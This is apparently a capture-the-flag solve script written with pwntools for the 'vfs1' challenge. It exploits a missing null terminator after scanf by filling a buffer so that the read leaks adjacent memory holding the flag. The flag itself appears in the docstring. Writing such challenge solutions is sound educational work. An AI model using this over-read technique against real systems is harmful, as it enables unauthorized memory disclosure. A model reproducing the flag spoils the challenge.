#!/usr/bin/env python3


"""
Basically, this does a scanf but doesn't make sure the last byte is a null byte, so we just
have to fill the last buffer entirely to get it to also print out the flag.
byuctf{more_like_VULNERABLE_file_system!}
"""

from pwn import *


exe = ELF("./vfs1")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       c
        ''')

    return r


def main():
    r = conn()

    log.progress("Exploiting")
    # Create 9 bogus files
    log.progress("Creating bogus files")
    for x in range(0,9):
        for y in range(0,3):
            r.sendline("1".encode())

    # Create real file
    log.progress("Creating real file")
    r.sendline("1".encode())
    r.sendline("exploit".encode())
    r.sendline(str(str("A"*255)+"Z").encode())

    # Read flag
    log.progress("Getting flag")
    r.sendline("4".encode())
    r.sendline("9".encode())
    result = r.recvuntil("Z".encode())

    flag = r.recvuntil("}".encode()).decode('ASCII')
    log.progress("Flag retrieved: ")
    print(flag)

if __name__ == "__main__":
    main()

